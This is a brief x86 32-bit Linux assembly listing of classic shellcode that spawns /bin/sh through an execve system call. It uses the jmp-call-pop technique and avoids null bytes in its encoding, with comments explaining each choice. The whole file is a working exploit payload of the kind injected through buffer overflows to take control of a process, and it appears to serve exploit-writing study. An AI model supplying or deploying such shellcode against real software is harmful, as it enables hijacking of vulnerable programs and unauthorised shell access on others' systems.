BITS 32
global _start
_start:
	xor eax,eax
	push eax         ; instead of "push 0"
    jmp short data   ; need access to data without data segment
code:
	mov ebx,[esp]    ; fname = "/bin/sh"
    mov [ebx+7],al   ; replace '0' by 0 in "db '/bin/sh','0'" see below
    mov ecx, esp     ; argv  = ["/bin/sh",NULL]
	xor edx,edx      ; envp  = NULL, instead of "mov edx,0"
	mov al, 0x0b     ; instead of "mov eax,11" = "mov eax,0x0000000b" 
	int 0x80
data:
    call code        ; pushes address of bytes below on stack
	db '/bin/sh','0'

